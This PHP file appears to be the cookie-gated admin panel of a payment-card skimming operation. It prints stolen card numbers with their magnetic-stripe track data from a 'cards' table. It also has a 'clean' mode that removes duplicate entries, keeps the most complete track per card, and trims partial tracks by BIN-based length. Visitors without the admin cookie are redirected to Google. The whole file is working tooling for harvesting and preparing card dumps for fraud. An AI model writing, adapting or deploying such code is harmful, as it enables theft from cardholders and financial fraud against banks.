<?php
	require_once 'config.php';
	
	if ($_COOKIE['admin'] !== $GLOBALS['admin']) {
		header('Location: http://www.google.com');
		exit();
	}
	
	header('Content-Type: text/plain');
	$r = mysql_query("SELECT * FROM cards order by date asc");
	
	if (isset($_GET["clean"])) {
		$cc = array();
		
		while ($row = mysql_fetch_assoc($r)) {
			$a = explode("=", $row['card']);
			if ($a === false || count($a) != 2)
				continue;
			
			$ccn = $a[0];
			$trk = $a[1];
			
			if (is_array(@$cc[$ccn]))
				array_push($cc[$ccn], $trk);
			else
				$cc[$ccn] = array($trk);
		}
		
//		ksort($cc);
		foreach ($cc as $ccn => $trkarr) {
			$trk = '';
			$maxlen = 0;
			foreach ($trkarr as $track) {
				if ($track[strlen($track) - 1] == '?') {
					$trk = $track;
					$maxlen = 0;
					break;
				} else if (strlen($track) > $maxlen)  {
					$trk = $track;
					$maxlen = strlen($track);
				}
			}
			
			if (!strlen($trk))
				continue;
			
			if ($maxlen) {
				$bin = mysql_real_escape_string(substr($ccn, 0, 6));
				$res = mysql_query("SELECT len FROM bins WHERE bin='$bin' LIMIT 1");
				if (mysql_num_rows($res)) {
					$row = mysql_fetch_assoc($res);
					
					$trk = substr($trk, 0, $row['len']);
				}
			}
			
			print "$ccn=$trk\n";
		}
	} else {
		while ($row = mysql_fetch_assoc($r)) {
			print "$row[card]\r\n";
		}
	}
?>
